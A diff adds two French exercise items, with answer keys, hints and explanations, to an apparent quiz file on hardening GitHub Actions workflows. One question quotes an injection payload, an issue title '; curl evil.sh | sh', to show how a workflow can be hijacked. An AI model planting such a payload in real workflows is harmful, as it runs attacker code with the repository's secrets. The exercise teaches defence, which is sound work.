@@ -252,6 +252,43 @@
       "fix": "      - run: ./scripts/deploy.sh\n        env:\n          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}",
       "hint": "Regardez comment le jeton est lu.",
       "answer": "Le contexte s’appelle secrets, pas secret : ${{ secret.DEPLOY_TOKEN }} est un contexte inconnu et le workflow est invalide. Mieux encore, passez le secret par env: plutôt que sur la ligne de commande, pour qu’il ne fasse jamais partie du texte de la commande."
+    },
+    {
+      "q": "Corrigez ce fichier : ce workflow déploie à chaque push et à chaque pull request, même quand les tests échouent, avec un jeton qui peut écrire dans le dépôt. Faites passer toutes les vérifications : déployer seulement après les tests, seulement depuis main.",
+      "type": "fixfile",
+      "code": "yaml",
+      "rules": [
+        "gha-pinned",
+        "gha-permissions",
+        {
+          "id": "gha-needs",
+          "job": "deploy",
+          "needs": "test"
+        },
+        {
+          "id": "gha-branch",
+          "job": "deploy"
+        }
+      ],
+      "start": "name: ci\non:\n  push:\n  pull_request:\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@main\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22\n          cache: npm\n      - run: npm ci\n      - run: npm test\n\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: ./scripts/deploy.sh\n        env:\n          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}",
+      "answer": "name: ci\non:\n  push:\n  pull_request:\n\npermissions:\n  contents: read\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22\n          cache: npm\n      - run: npm ci\n      - run: npm test\n\n  deploy:\n    needs: test\n    if: github.event_name == 'push' && github.ref == 'refs/heads/main'\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: ./scripts/deploy.sh\n        env:\n          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}",
+      "hint": "deploy needs: test, et if: github.event_name == 'push' && github.ref == 'refs/heads/main'. Un bloc permissions: avec contents: read ; checkout figé sur @v4.",
+      "explain": "Les jobs tournent en parallèle sauf si needs: les enchaîne : sans lui, deploy tournait pendant que les tests tournaient encore (ou échouaient). Le if: limite les pull requests et les autres branches au job de test. permissions: contents: read donne au GITHUB_TOKEN un accès en lecture seule (le déploiement utilise son propre secret). @main suit tout ce qui est poussé sur cette branche de l’action : figez une version, ou mieux un SHA de commit complet, que personne ne peut déplacer (le guide de sécurisation de GitHub le recommande, et Dependabot sait tenir les SHA à jour)."
+    },
+    {
+      "q": "Corrigez ce fichier : ce workflow de tri divulgue une URL de webhook, peut être détourné par un titre d’issue comme \"; curl evil.sh | sh\" et donne tous les droits à son jeton. Faites passer toutes les vérifications (l’URL est enregistrée dans le secret de dépôt CHAT_WEBHOOK_URL ; le job ne fait qu’étiqueter les issues).",
+      "type": "fixfile",
+      "code": "yaml",
+      "rules": [
+        "gha-secrets",
+        "gha-injection",
+        "gha-permissions",
+        "gha-pinned"
+      ],
+      "start": "name: triage\non:\n  issues:\n    types: [opened]\n\npermissions: write-all\n\njobs:\n  notify:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Post to the team chat\n        env:\n          CHAT_WEBHOOK_URL: https://chat.example.com/hooks/T01/B02/kq9Xz7\n        run: |\n          curl -sS -X POST \"$CHAT_WEBHOOK_URL\" \\\n            --data-urlencode \"text=New issue: ${{ github.event.issue.title }}\"\n      - uses: actions/github-script@main\n        with:\n          script: |\n            await github.rest.issues.addLabels({\n              ...context.repo, issue_number: context.issue.number, labels: [\"triage\"] })",
+      "answer": "name: triage\non:\n  issues:\n    types: [opened]\n\npermissions:\n  issues: write\n\njobs:\n  notify:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Post to the team chat\n        env:\n          CHAT_WEBHOOK_URL: ${{ secrets.CHAT_WEBHOOK_URL }}\n          ISSUE_TITLE: ${{ github.event.issue.title }}\n        run: |\n          curl -sS -X POST \"$CHAT_WEBHOOK_URL\" \\\n            --data-urlencode \"text=New issue: $ISSUE_TITLE\"\n      - uses: actions/github-script@v7\n        with:\n          script: |\n            await github.rest.issues.addLabels({\n              ...context.repo, issue_number: context.issue.number, labels: [\"triage\"] })",
+      "hint": "Passez le titre de l’issue dans env: (ISSUE_TITLE: ${{ github.event.issue.title }}) et utilisez \"$ISSUE_TITLE\" dans le script. permissions: issues: write.",
+      "explain": "${{ … }} est collé dans le script avant que le shell ne l’exécute : un titre contenant \" ou $( ) devient du code (injection de script : quiconque peut ouvrir une issue exécute des commandes avec votre jeton et vos secrets). Passé par env:, le titre n’est que la valeur d’une variable. Une URL de webhook est un mot de passe : qui la possède publie dans votre messagerie, et une URL commitée reste dans l’historique Git (changez-la). Les secrets sont masqués dans les logs. Le job n’a besoin que d’étiqueter les issues : issues: write, rien d’autre. Et une action utilisée avec des droits d’écriture est figée, jamais @main."
     }
   ],
   "interview": [
